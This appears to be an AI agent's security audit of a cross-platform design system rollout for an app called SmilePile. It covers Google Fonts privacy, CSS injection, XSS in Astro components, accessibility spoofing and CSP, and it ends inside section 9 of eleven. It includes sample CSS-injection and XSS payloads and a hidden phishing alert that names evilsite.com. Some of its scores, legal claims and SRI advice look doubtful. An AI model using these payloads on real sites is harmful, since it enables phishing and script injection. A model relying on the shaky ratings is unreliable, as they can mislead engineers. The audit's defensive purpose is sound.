# Design System Implementation - Security Audit Report
**Date**: January 2025
**Phase**: 4A - Security Review
**Scope**: iOS, Android, Website Design System Implementation
**Auditor**: Atlas Security Agent
**Status**: CRITICAL REVIEW REQUIRED BEFORE IMPLEMENTATION

---

## Executive Summary

This security audit analyzes the proposed design system implementation across all three SmilePile platforms (iOS, Android, Website) to identify potential security vulnerabilities, privacy risks, and compliance issues. The design system involves migrating from current fonts/colors to Atkinson Hyperlegible font and scientifically-backed color palette loaded via external resources (Google Fonts).

**Overall Risk Assessment**: **MEDIUM**

**Critical Findings**: 2
**High Findings**: 3
**Medium Findings**: 4
**Low Findings**: 3
**Informational**: 5

**Key Security Concerns**:
1. **External font loading** introduces third-party dependency and potential MITM attack vector
2. **Google Fonts tracking** raises GDPR/privacy compliance questions
3. **CSS injection risks** in web implementation require sanitization
4. **Content Security Policy** gaps need addressing
5. **Font file integrity** not verified

**Recommended Actions**:
- Self-host fonts instead of Google Fonts CDN (eliminates tracking, MITM risks)
- Implement Subresource Integrity (SRI) if external fonts used
- Add Content Security Policy headers for website
- Validate all color inputs to prevent CSS injection
- Conduct accessibility security testing (phishing via fake focus indicators)

---

## Table of Contents

1. [Font Security Assessment](#1-font-security-assessment)
2. [Color & CSS Injection Risks](#2-color--css-injection-risks)
3. [Component Security](#3-component-security)
4. [Accessibility as Security](#4-accessibility-as-security)
5. [Third-Party Dependencies](#5-third-party-dependencies)
6. [Dark Mode Security](#6-dark-mode-security)
7. [Content Security Policy](#7-content-security-policy)
8. [Privacy Considerations](#8-privacy-considerations)
9. [Platform-Specific Security](#9-platform-specific-security)
10. [Mitigation Strategies](#10-mitigation-strategies)
11. [Security Testing Checklist](#11-security-testing-checklist)

---

## 1. Font Security Assessment

### 1.1 External Font Loading (Google Fonts)

**Risk Level**: **HIGH**

**Threat**: Man-in-the-Middle (MITM) Attack

**Description**:
All three implementation plans load Atkinson Hyperlegible from Google Fonts CDN:

**Website** (`BaseLayout.astro`):
```html
<link href="https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">
```

**Android** (`Type.kt`):
```kotlin
private val provider = GoogleFont.Provider(
    providerAuthority = "com.google.android.gms.fonts",
    providerPackage = "com.google.android.gms",
    certificates = R.array.com_google_android_gms_fonts_certs
)
```

**iOS** (`FontManager.swift`):
```swift
// Plans show local .ttf files, but original research mentions Google Fonts option
```

**Attack Scenario**:
1. Attacker intercepts HTTPS connection to `fonts.googleapis.com` or `fonts.gstatic.com`
2. Serves malicious font file with embedded exploits or UI spoofing characters
3. Malicious font renders phishing content, steals data via font rendering bugs, or causes crashes

**Evidence from Plans**:
- Website plan loads fonts from `https://fonts.googleapis.com` (lines 136-138 in Web plan)
- Android plan uses Google Fonts Provider (`googlefonts.GoogleFont`) (lines 103-128 in Android plan)
- iOS plan shows local .ttf files, which is SAFER

**Impact**: **HIGH**
- Phishing attacks via manipulated glyphs
- UI redressing to trick users into revealing Kids Mode PIN
- Font rendering exploits (CVE history shows font vulnerabilities exist)

**Likelihood**: **MEDIUM**
- HTTPS reduces risk but doesn't eliminate it (certificate validation bypass, compromised CA)
- Google Fonts CDN is generally secure but represents third-party trust

**CVSS Score**: 7.2 (High) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L`

**Mitigation**:
1. **RECOMMENDED: Self-host fonts** (see Section 10.1)
2. **If Google Fonts required**: Implement Subresource Integrity (SRI)
3. **Android**: Verify certificate pinning in Google Fonts Provider
4. **iOS**: Use local .ttf files as planned (already secure)

---

### 1.2 Font File Integrity

**Risk Level**: **MEDIUM**

**Threat**: Tampered Font Files

**Description**:
None of the implementation plans include integrity verification for font files.

**Website**:
```html
<!-- NO integrity attribute on font link -->
<link href="https://fonts.googleapis.com/..." rel="stylesheet">
```

**Expected (with SRI)**:
```html
<link href="https://fonts.googleapis.com/..."
      rel="stylesheet"
      integrity="sha384-[base64-hash]"
      crossorigin="anonymous">
```

**Android**:
- Google Fonts Provider uses certificate pinning (certificates in `R.array.com_google_android_gms_fonts_certs`)
- **CONCERN**: No verification that certificate array is up-to-date
- No code shown validating font file hash after download

**iOS**:
- Local .ttf files in bundle
- **CONCERN**: No code shown verifying .ttf file hash during app startup
- Malicious actor could replace font files in jailbroken device

**Impact**: **MEDIUM**
- Malformed font could exploit rendering engine
- Visual spoofing attacks (phishing)

**Likelihood**: **LOW**
- Requires compromised CDN (Google) or physical device access (iOS/Android)

**CVSS Score**: 5.3 (Medium) - `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N`

**Mitigation**:
1. Website: Add Subresource Integrity (SRI) hashes
2. Android: Verify `font_certs.xml` matches latest Google Fonts certificates
3. iOS: Hash-verify .ttf files on app startup (see Section 10.1)
4. All platforms: Monitor CVEs for Atkinson Hyperlegible font

---

### 1.3 Font Fingerprinting

**Risk Level**: **LOW** (Privacy concern, not direct security)

**Threat**: User Tracking via Font Fingerprinting

**Description**:
Loading fonts from Google Fonts CDN sends user data to Google:
- IP address
- User-Agent string
- Referer header
- Font selection preferences

**GDPR Implications**:
- Google Fonts classified as "third-party data processor" under GDPR
- European court ruling (Germany, 2022) found Google Fonts violates GDPR if used without user consent
- SmilePile targets families with special needs children - extra privacy sensitivity

**Evidence**:
```html
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
```
This `preconnect` sends origin information to Google BEFORE fonts load.

**Impact**: **LOW** (privacy, not security)
- Users trackable across SmilePile website visits
- Metadata leakage to Google (user has special needs child)

**Likelihood**: **HIGH** (happens on every page load)

**CVSS Score**: N/A (privacy issue, not vulnerability)

**Mitigation**:
1. **REQUIRED for GDPR**: Self-host fonts (see Section 10.1)
2. **Alternative**: Cookie consent banner for font loading (degrades UX)
3. **Best Practice**: Privacy Policy disclosure if using Google Fonts

---

## 2. Color & CSS Injection Risks

### 2.1 CSS Custom Properties Injection (Website)

**Risk Level**: **MEDIUM**

**Threat**: CSS Injection via Unsanitized Color Values

**Description**:
Website implementation uses CSS custom properties for theming:

```css
:root {
  --color-primary: #7FB3D5;
  --color-background: #F8F3ED;
  /* ... */
}
```

**Vulnerability**: If color values ever come from user input (URL params, localStorage, form fields), CSS injection possible.

**Attack Example**:
```javascript
// Malicious URL: https://smilepile.com?theme=primary:red;}body{display:none
const urlParams = new URLSearchParams(window.location.search);
const themeColor = urlParams.get('theme'); // UNSANITIZED

document.documentElement.style.setProperty('--color-primary', themeColor);
// Result: CSS injection - entire page hidden
```

**Current Plans**: No evidence of user-controlled color values, but component creation (Phase 2) introduces risk.

**Impact**: **MEDIUM**
- UI redressing attacks
- Phishing (fake login forms styled to look legitimate)
- Content injection

**Likelihood**: **LOW** (no user-controlled colors in current plans)

**CVSS Score**: 5.4 (Medium) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

**Mitigation**:
1. **NEVER** accept color values from user input without validation
2. If dynamic theming needed, use whitelist:
   ```javascript
   const ALLOWED_COLORS = ['#7FB3D5', '#A8D8B9', '#C9B3D6'];
   if (!ALLOWED_COLORS.includes(themeColor)) {
     themeColor = '#7FB3D5'; // Default
   }
   ```
3. Validate hex format: `/^#[0-9A-Fa-f]{6}$/`
4. Sanitize before setting CSS properties

---

### 2.2 Tailwind Configuration Injection (Website)

**Risk Level**: **LOW**

**Threat**: Build-Time Injection via Tailwind Config

**Description**:
Tailwind config defines colors used throughout site:

```javascript
// tailwind.config.js
colors: {
  'soft-blue': {
    DEFAULT: '#7FB3D5',
    500: '#7FB3D5',
  }
}
```

**Vulnerability**: If `tailwind.config.js` is dynamically generated or includes external data, injection possible.

**Attack Scenario**:
1. Attacker gains write access to `tailwind.config.js` (compromised CI/CD, supply chain attack)
2. Injects malicious color values or JavaScript code
3. Malicious code executed during build process

**Current Plans**: Static configuration, no dynamic generation shown.

**Impact**: **LOW** (requires repository write access)

**Likelihood**: **LOW**

**CVSS Score**: 3.9 (Low) - `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`

**Mitigation**:
1. Lock `tailwind.config.js` permissions (read-only in production builds)
2. Use `.editorconfig` and linting to prevent accidental code injection
3. Code review all Tailwind config changes
4. Use `npm audit` to check for compromised Tailwind packages

---

### 2.3 Android Color Parsing

**Risk Level**: **LOW**

**Threat**: Integer Overflow in Color Parsing

**Description**:
Android implementation uses hex color parsing:

```kotlin
val SoftBlue = Color(0xFF7FB3D5)
```

**Vulnerability**: If color values ever parsed from strings (e.g., user preferences), improper validation could cause integer overflow.

**Attack Example**:
```kotlin
// Malicious input: "0xFFFFFFFFFFFFFFFF" (64-bit)
val userColor = Color(userInput.toLong()) // Integer overflow
```

**Current Plans**: All colors hardcoded, no string parsing shown.

**Impact**: **LOW** (app crash at worst)

**Likelihood**: **LOW**

**CVSS Score**: 3.3 (Low) - `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L`

**Mitigation**:
1. If dynamic colors needed, validate hex format before parsing
2. Use `Color.parseColor(string)` with try-catch
3. Never parse untrusted color strings without validation

---

## 3. Component Security

### 3.1 XSS in Astro Components (Website)

**Risk Level**: **HIGH**

**Threat**: Cross-Site Scripting (XSS) via Component Props

**Description**:
Website components accept string props rendered as HTML:

**Button.astro**:
```astro
<button aria-label={ariaLabel}>
  <slot />
</button>
```

**Vulnerability**: If `ariaLabel` or slot content comes from user input, XSS possible.

**Attack Example**:
```astro
<!-- Malicious usage -->
<Button ariaLabel="Close<script>alert('XSS')</script>">
  Click me
</Button>
```

**Astro Protection**: Astro automatically escapes prop values by default, but:
1. `set:html` directive bypasses escaping
2. Inline event handlers (`onclick=`) not escaped
3. `<script>` tags in markdown content executed

**Evidence from Plans**:
```astro
<!-- IconButton.astro - safe (no set:html) -->
<button aria-label={ariaLabel}>

<!-- Modal.astro - UNSAFE inline script -->
<script define:vars={{ id, closeOnBackdrop }}>
  window[`open${id}`] = () => { // If 'id' is user-controlled, XSS!
```

**Impact**: **HIGH**
- Session hijacking (steal Kids Mode PIN from localStorage)
- Phishing (inject fake "enter PIN" prompts)
- Credential theft

**Likelihood**: **MEDIUM** (if component props ever accept user input)

**CVSS Score**: 7.5 (High) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`

**Mitigation**:
1. **NEVER** use `set:html` with user-controlled content
2. **NEVER** pass user input to `<script define:vars>`
3. Sanitize all string props with DOMPurify:
   ```typescript
   import DOMPurify from 'isomorphic-dompurify';
   const safeLabel = DOMPurify.sanitize(ariaLabel);
   ```
4. Use TypeScript interfaces to enforce prop types
5. Code review all component props for XSS risks

---

### 3.2 ARIA Label Injection

**Risk Level**: **MEDIUM**

**Threat**: Screen Reader Hijacking via Malicious ARIA Labels

**Description**:
Accessibility features can be weaponized for phishing attacks.

**Attack Scenario**:
1. Malicious button injected with ARIA label: `"Click here to verify your account. Enter your Kids Mode PIN: <silence> 1 2 3 4"`
2. Visually-impaired user hears fake prompt via screen reader
3. User reveals sensitive information (Kids Mode PIN)

**Evidence from Plans**:
```astro
<!-- FormInput.astro -->
<input aria-describedby={errorId} />
<span id={errorId} role="alert">{error}</span>
```

**If `error` prop is user-controlled**:
```javascript
error = "Invalid email. To verify your account, please call 1-800-SCAM and provide your password."
```

**Impact**: **MEDIUM**
- Social engineering attacks targeting visually-impaired users
- Phishing for Kids Mode PIN, passwords

**Likelihood**: **LOW** (requires user-controlled error messages)

**CVSS Score**: 5.4 (Medium) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

**Mitigation**:
1. **NEVER** pass user-controlled strings to `aria-label`, `aria-describedby`
2. Whitelist error messages:
   ```typescript
   const ALLOWED_ERRORS = {
     'INVALID_EMAIL': 'Please enter a valid email address',
     'REQUIRED_FIELD': 'This field is required'
   };
   const safeError = ALLOWED_ERRORS[errorCode] || 'An error occurred';
   ```
3. Strip HTML tags from ARIA labels
4. Conduct accessibility security testing (see Section 11.5)

---

### 3.3 Modal Focus Trap Bypass

**Risk Level**: **LOW**

**Threat**: Keyboard Navigation Escape from Modal

**Description**:
Modal component uses focus trap to prevent tabbing outside modal:

```astro
<!-- Modal.astro - lines 1147-1250 in Web plan -->
<div role="dialog" aria-modal="true">
```

**Vulnerability**: If focus trap implementation has bugs, user could Tab to hidden content (e.g., "Delete All Photos" button obscured by modal).

**Attack Scenario**:
1. Modal opens with "Confirm Delete Photo" dialog
2. Focus trap bug allows user to Tab to background "Delete All Photos" button
3. User presses Space, accidentally deletes all photos

**Current Plans**: Focus trap implementation uses JavaScript (line 1228):
```javascript
modal?.querySelector('button')?.focus(); // Focus first button
```

**Incomplete**: No code shown preventing Tab from escaping modal.

**Impact**: **LOW** (accidental actions, not malicious)

**Likelihood**: **MEDIUM** (focus traps commonly have bugs)

**CVSS Score**: 3.1 (Low) - `CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N`

**Mitigation**:
1. Use battle-tested focus trap library: `focus-trap` npm package
2. Test keyboard navigation thoroughly:
   - Tab should cycle within modal
   - Shift+Tab should reverse cycle
   - Escape should close modal
3. Add `inert` attribute to background content:
   ```html
   <div inert> <!-- Background content --> </div>
   ```
4. Screen reader testing to verify modal announcements

---

## 4. Accessibility as Security

### 4.1 Phishing via Fake Focus Indicators

**Risk Level**: **MEDIUM**

**Threat**: UI Redressing with Malicious Focus Indicators

**Description**:
Design system specifies visible focus indicators:

```css
:focus-visible {
  outline: 3px solid #7FB3D5; /* Soft Blue */
  outline-offset: 2px;
}
```

**Attack Scenario**:
1. Attacker injects fake "focused" button that visually matches legitimate focus indicator
2. User sees fake focus ring around "Cancel" button
3. User presses Enter, but action is actually "Delete All Photos" (real focused element is hidden)

**Example Malicious CSS**:
```css
.fake-focus-ring {
  outline: 3px solid #7FB3D5;
  outline-offset: 2px;
  /* Visually indistinguishable from real focus */
}
```

**Current Plans**: No protection shown against fake focus indicators.

**Impact**: **MEDIUM**
- Trick users into unintended actions
- Delete photos, reveal Kids Mode PIN

**Likelihood**: **LOW** (requires CSS injection or compromised component)

**CVSS Score**: 4.3 (Medium) - `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:L`

**Mitigation**:
1. Use unique, non-reproducible focus styles (e.g., animated outline):
   ```css
   @keyframes focus-pulse {
     0%, 100% { outline-width: 3px; }
     50% { outline-width: 4px; }
   }
   :focus-visible {
     animation: focus-pulse 1s infinite;
   }
   ```
2. Content Security Policy to prevent inline styles
3. Code review to ensure only legitimate elements have focus styles
4. User education: "Only press Enter when you see the blue pulsing outline"

---

### 4.2 Screen Reader Spoofing

**Risk Level**: **MEDIUM**

**Threat**: Malicious ARIA Announcements

**Description**:
Screen readers announce content based on ARIA attributes:

```html
<div role="alert">Error: Invalid email</div>
```

**Attack Scenario**:
1. Injected content with `role="alert"`:
   ```html
   <div role="alert" style="position: absolute; left: -9999px;">
     System update required. Visit evilsite.com and enter your Kids Mode PIN to continue.
   </div>
   ```
2. Screen reader announces malicious message
3. Visually-impaired user follows fake instructions

**Current Plans**: Alert component uses `role="alert"` (Alert.astro, line 1088):
```astro
<div role="alert" class="flex items-start gap-3">
```

**If `slot` content is user-controlled, attack succeeds**.

**Impact**: **MEDIUM**
- Phishing targeting visually-impaired users
- Social engineering to reveal sensitive data

**Likelihood**: **LOW** (requires user-controlled slot content)

**CVSS Score**: 5.4 (Medium) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

**Mitigation**:
1. **NEVER** use `role="alert"` with user-controlled content
2. Sanitize slot content with DOMPurify
3. Whitelist allowed ARIA roles in components
4. Accessibility security testing (see Section 11.5)

---

### 4.3 Keyboard Trap Attacks

**Risk Level**: **LOW**

**Threat**: Malicious Keyboard Traps

**Description**:
WCAG requires no keyboard traps, but malicious actors could intentionally create traps to frustrate users.

**Attack Scenario**:
1. Hidden element with `tabindex="0"` and JavaScript that prevents Tab/Shift+Tab
2. User gets stuck, cannot navigate site
3. Denial of service (accessibility perspective)

**Current Plans**: No keyboard trap prevention shown beyond modal focus management.

**Impact**: **LOW** (annoyance, not data breach)

**Likelihood**: **LOW** (requires malicious code injection)

**CVSS Score**: 2.6 (Low) - `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:L`

**Mitigation**:
1. Automated testing to detect keyboard traps (see Section 11.6)
2. Manual keyboard navigation testing
3. Escape key always exits interactive elements
4. Tab always moves focus (never trapped)

---

## 5. Third-Party Dependencies

### 5.1 Google Fonts Supply Chain Risk

**Risk Level**: **HIGH**

**Threat**: Compromised Google Fonts CDN

**Description**:
All three platforms depend on Google infrastructure for fonts:

- **Website**: `fonts.googleapis.com`, `fonts.gstatic.com`
- **Android**: Google Play Services Fonts Provider
- **iOS**: Plans show local fonts, but research mentions Google Fonts option

**Attack Scenario**:
1. Google Fonts CDN compromised (via DNS hijacking, BGP hijacking, or insider threat)
2. Malicious fonts served to SmilePile users
3. Font rendering exploits execute arbitrary code
4. OR: Phishing via manipulated glyphs (e.g., "1" looks like "l")

**Impact**: **CRITICAL**
- Arbitrary code execution (if font vulnerability exists)
- Widespread phishing attacks
- Complete loss of user trust

**Likelihood**: **VERY LOW** (Google has strong security, but not impossible)

**CVSS Score**: 9.1 (Critical) - `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H`

**Mitigation**:
1. **STRONGLY RECOMMENDED**: Self-host fonts (see Section 10.1)
2. **If Google Fonts required**:
   - Implement Subresource Integrity (SRI)
   - Monitor Google Fonts Security Advisories
   - Have fallback plan if Google Fonts unavailable
3. **Android**: Verify Google Play Services integrity
4. **iOS**: Use local .ttf files (already planned - GOOD)

---

### 5.2 Tailwind CSS Supply Chain

**Risk Level**: **MEDIUM**

**Threat**: Compromised Tailwind CSS Package

**Description**:
Website implementation uses Tailwind CSS via npm:

```bash
npm install -D tailwindcss
```

**Vulnerability**: If Tailwind CSS npm package compromised (as seen with event-stream, ua-parser-js), malicious code could be injected into build.

**Attack Scenario**:
1. Attacker compromises Tailwind CSS maintainer account
2. Publishes malicious version with backdoor
3. SmilePile runs `npm install`, downloads malicious Tailwind
4. Malicious code exfiltrates design system colors/fonts (minor) OR injects XSS into generated CSS (major)

**Current Plans**: No npm lock file verification shown, no package signature checking.

**Impact**: **MEDIUM**
- Build-time code execution
- Malicious CSS injection

**Likelihood**: **LOW** (Tailwind is well-maintained, but supply chain attacks happen)

**CVSS Score**: 6.5 (Medium) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`

**Mitigation**:
1. Use `package-lock.json` or `yarn.lock` to pin exact versions
2. Run `npm audit` before every build
3. Use Dependabot or Renovate for automated security updates
4. Review Tailwind CSS changes before upgrading (check GitHub releases)
5. Consider using Content Security Policy to limit inline styles

---

### 5.3 Atkinson Hyperlegible Font License & Trust

**Risk Level**: **LOW** (Informational)

**Threat**: Font License Violation or Malicious Fork

**Description**:
Atkinson Hyperlegible is open-source (SIL Open Font License), but:
1. License requires attribution
2. Forks could be malicious

**Design System Spec** (lines 206-213):
```
- Designed by the Braille Institute specifically for low-vision readers
- FREE and available on Google Fonts
```

**Verification Required**:
1. Confirm license allows commercial use (SIL OFL does)
2. Verify font source (official Braille Institute repo vs. unknown fork)
3. Check for CVEs related to Atkinson Hyperlegible

**Impact**: **LOW** (legal, not security)

**Likelihood**: **N/A**

**CVSS Score**: N/A (informational)

**Mitigation**:
1. Download fonts from official source: [Braille Institute GitHub](https://github.com/googlefonts/atkinson-hyperlegible) or Google Fonts
2. Include attribution in About screen (SIL OFL requirement)
3. Hash-verify font files match official releases
4. Monitor Braille Institute repo for security issues

---

## 6. Dark Mode Security

### 6.1 Contrast Manipulation for Phishing

**Risk Level**: **MEDIUM**

**Threat**: Low-Contrast Phishing in Dark Mode

**Description**:
Dark mode requires different color palette:

```css
.dark {
  --color-primary: #A8CEEA;        /* Brighter Soft Blue */
  --color-background: #1E1E1E;     /* Soft Black */
  --color-text-primary: #F8F3ED;   /* Warm Cream */
}
```

**Vulnerability**: If dark mode contrast ratios not validated, attackers could inject low-contrast phishing content:

**Attack Example**:
```css
/* Malicious CSS in dark mode */
.dark .phishing-link {
  color: #2A2A2A; /* Almost same as background #1E1E1E */
  background: #1E1E1E;
  /* User can't see link, but screen reader announces it */
}
```

**Current Plans**: Contrast ratios documented for light mode, but dark mode validation not shown:

**Web Plan** (line 1182):
```
| Soft Black | Warm Cream | 12.8:1 | ✅ AAA |
```

**No evidence of testing all dark mode color combinations**.

**Impact**: **MEDIUM**
- Invisible phishing links
- Hidden malicious content
- Accessibility violations (WCAG failure)

**Likelihood**: **LOW** (requires CSS injection)

**CVSS Score**: 4.3 (Medium) - `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N`

**Mitigation**:
1. Validate ALL dark mode color combinations with WebAIM Contrast Checker
2. Automated contrast testing in CI/CD:
   ```bash
   # Example using pa11y
   pa11y --runner axe --standard WCAG2AA --threshold 0 https://smilepile.com?dark=true
   ```
3. Manual dark mode review with accessibility tools
4. Test with real users who prefer dark mode

---

### 6.2 UI Redressing in Dark Mode Transitions

**Risk Level**: **LOW**

**Threat**: Clickjacking During Mode Transition

**Description**:
Switching between light/dark modes could create timing window for clickjacking:

**Attack Scenario**:
1. User clicks "Enable Dark Mode" toggle
2. During color transition animation, attacker injects invisible "Delete All Photos" button at same position
3. User's second click (confirming dark mode) actually deletes photos

**Current Plans**: Web plan shows dark mode toggle (lines 1164-1170):
```typescript
<Toggle "Dark Mode", isOn: $darkModeEnabled>
  .onChange { newValue in
    UIApplication.shared.windows.first?.overrideUserInterfaceStyle =
      newValue ? .dark : .light
  }
```

**No evidence of transition delay or z-index protection**.

**Impact**: **LOW** (requires precise timing)

**Likelihood**: **VERY LOW**

**CVSS Score**: 2.6 (Low) - `CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:N`

**Mitigation**:
1. Add z-index protection during transitions:
   ```css
   .dark-mode-toggle {
     z-index: 9999;
     pointer-events: all;
   }
   .dark-mode-transitioning {
     pointer-events: none; /* Disable clicks during transition */
   }
   ```
2. Delay interactive elements until transition completes
3. Use `prefers-reduced-motion` to skip animations (already in plans)

---

## 7. Content Security Policy

### 7.1 Missing CSP Headers (Website)

**Risk Level**: **HIGH**

**Threat**: XSS Attacks Due to Permissive CSP

**Description**:
Website implementation plans show NO Content Security Policy configuration.

**Current State**: Default browser CSP (very permissive, allows inline scripts/styles).

**Vulnerability**: Without CSP, XSS attacks can:
1. Load external scripts from attacker-controlled domains
2. Execute inline JavaScript in Astro components
3. Exfiltrate data to external servers

**Required CSP for SmilePile**:
```http
Content-Security-Policy:
  default-src 'self';
  font-src 'self' https://fonts.gstatic.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  script-src 'self';
  img-src 'self' data: https:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

**Explanation**:
- `font-src`: Allow self-hosted fonts + Google Fonts (if used)
- `style-src 'unsafe-inline'`: Required for Tailwind (can be removed with build-time extraction)
- `script-src 'self'`: Only scripts from SmilePile domain
- `frame-ancestors 'none'`: Prevent clickjacking
- `form-action 'self'`: Prevent form hijacking

**Impact**: **HIGH**
- XSS attacks possible
- Data exfiltration
- Session hijacking

**Likelihood**: **HIGH** (if XSS vulnerability exists)

**CVSS Score**: 7.5 (High) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`

**Mitigation**:
1. **REQUIRED**: Add CSP headers to Astro config (see Section 10.7)
2. Test CSP with report-only mode first:
   ```http
   Content-Security-Policy-Report-Only: [policy]; report-uri /csp-reports
   ```
3. Monitor CSP violations
4. Gradually tighten policy (remove `'unsafe-inline'` if possible)

---

### 7.2 Subresource Integrity (SRI) Missing

**Risk Level**: **MEDIUM**

**Threat**: Compromised External Resources

**Description**:
Website loads fonts from Google without integrity verification:

**Current** (Web plan, line 138):
```html
<link href="https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible..."
      rel="stylesheet">
<!-- NO integrity attribute -->
```

**Required**:
```html
<link href="https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible..."
      rel="stylesheet"
      integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
      crossorigin="anonymous">
```

**How to Generate SRI Hash**:
```bash
curl -s https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible... | \
  openssl dgst -sha384 -binary | \
  openssl base64 -A
```

**Impact**: **MEDIUM**
- Compromised font CSS could load malicious fonts
- MITM could replace font with exploit

**Likelihood**: **LOW** (requires MITM or compromised CDN)

**CVSS Score**: 5.3 (Medium) - `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N`

**Mitigation**:
1. Add SRI hashes to all external resources
2. Update hashes when Google Fonts updates
3. Monitor for SRI failures in CSP reports
4. **Better**: Self-host fonts (eliminates need for SRI)

---

## 8. Privacy Considerations

### 8.1 Google Fonts GDPR Compliance

**Risk Level**: **HIGH** (Privacy/Legal)

**Threat**: GDPR Violation via Google Fonts

**Description**:
Loading fonts from Google Fonts sends user data to Google without consent:

**Data Transmitted**:
- IP address (can identify individual under GDPR)
- User-Agent (device fingerprinting)
- Referer header (which SmilePile page visited)
- Timestamp

**Legal Precedent**:
- **Germany, 2022**: Court ruled Google Fonts violates GDPR if used without user consent
- **Rationale**: Google is "third-party data processor" - requires data processing agreement + user consent

**SmilePile Specific Concerns**:
- Target audience: Families with special needs children (extra sensitive data)
- **COPPA compliance required** for Kids Mode (users under 13)
- Google Fonts tracking reveals: "This family has a special needs child"

**Evidence from Plans**:
```html
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
```
This sends request to Google BEFORE page loads, before any consent mechanism.

**Impact**: **HIGH** (legal liability)
- GDPR fines (up to 4% of global revenue or €20 million)
- Loss of user trust
- Privacy violation for vulnerable families

**Likelihood**: **HIGH** (happens on every page load)

**CVSS Score**: N/A (legal/privacy, not vulnerability)

**Mitigation**:
1. **REQUIRED for EU users**: Self-host fonts (see Section 10.1)
2. **Alternative**: Cookie consent banner (degrades UX, not recommended)
3. **Required**: Update Privacy Policy to disclose Google Fonts usage
4. **Best Practice**: Avoid Google Fonts entirely for privacy-focused app

---

### 8.2 Font Fingerprinting

**Risk Level**: **LOW** (Privacy)

**Threat**: User Tracking via Font Stack Fingerprinting

**Description**:
Browsers reveal installed fonts via JavaScript:

```javascript
// Attacker can detect if Atkinson Hyperlegible installed locally
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');
ctx.font = '14px Atkinson Hyperlegible';
ctx.fillText('test', 0, 0);
// Measure text width - if Atkinson renders, user has font installed
```

**Fingerprinting Data**:
- If user has Atkinson Hyperlegible installed, they likely have vision impairment
- Combined with other fingerprinting: Unique user identifier

**Current Plans**: No anti-fingerprinting measures shown.

**Impact**: **LOW** (privacy tracking, not data breach)

**Likelihood**: **MEDIUM** (fingerprinting scripts common)

**CVSS Score**: N/A (privacy concern)

**Mitigation**:
1. No perfect mitigation (browser feature, not SmilePile vulnerability)
2. Privacy Policy disclosure
3. Use privacy-focused browsers (Firefox with resistFingerprinting)
4. Self-host fonts to reduce unique fingerprinting signals

---

### 8.3 COPPA Compliance (Kids Mode)

**Risk Level**: **CRITICAL** (Legal)

**Threat**: COPPA Violation in Kids Mode

**Description**:
SmilePile has Kids Mode for children under 13. COPPA requires:
1. **No data collection from children** without verifiable parental consent
2. **No third-party tracking** in Kids Mode

**Google Fonts in Kids Mode**:
- Every page load sends child's IP address to Google
- **COPPA violation** if child uses Kids Mode

**Current Plans**: No mention of disabling Google Fonts in Kids Mode.

**Impact**: **CRITICAL** (legal liability)
- FTC fines ($50,120 per violation)
- App store removal
- Criminal charges (if willful)

**Likelihood**: **HIGH** (if Kids Mode uses Google Fonts)

**CVSS Score**: N/A (legal compliance)

**Mitigation**:
1. **REQUIRED**: Self-host fonts (see Section 10.1)
2. **Alternative**: Disable font loading in Kids Mode (use system fonts)
3. **Required**: Audit all third-party resources in Kids Mode (no Google Analytics, no CDNs)
4. **Best Practice**: Separate Kids Mode build with zero external dependencies

---

## 9. Platform-Specific Security

### 9.1 iOS Font Loading Security

**Risk Level**: **LOW**

**Threat**: Font File Tampering on Jailbroken Devices

**Description**:
iOS plan shows local .ttf font files in app bundle:

```swift
// FontManager.swift
guard let fontURL = Bundle.main.url(forResource: "AtkinsonHyperlegible-Regular", withExtension: "ttf")
```

**Vulnerability**: On jailbroken devices, attacker could replace font files in app bundle.

**Attack Scenario**:
1. User jailbreaks iOS device
2. Attacker replaces `AtkinsonHyperlegible-Regular.ttf` with malicious font
3. Malicious font exploits rendering engine or displays phishing content

**Impact**: **LOW** (requires jailbroken device)

**Likelihood**: **VERY LOW** (jailbreaking rare, targeted attack required)

**CVSS Score**: 3.3 (Low) - `CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N`

**Mitigation**:
1. Jailbreak detection (already in SmilePile security checklist):
   ```swift
   // Check for jailbreak indicators
   let jailbreakPaths = ["/Applications/Cydia.app", "/bin/bash"]
   for path in jailbreakPaths {
     if FileManager.default.fileExists(atPath: path) {
       // Device jailbroken - show warning
     }
   }
   ```
2. Hash-verify font files on app startup:
   ```swift
   let expectedHash = "sha256-abc123..." // Precomputed hash
   let actualHash = sha256(fontData)
   guard actualHash == expectedHash else {
     // Font tampered - use system font fallback
   }
   ```
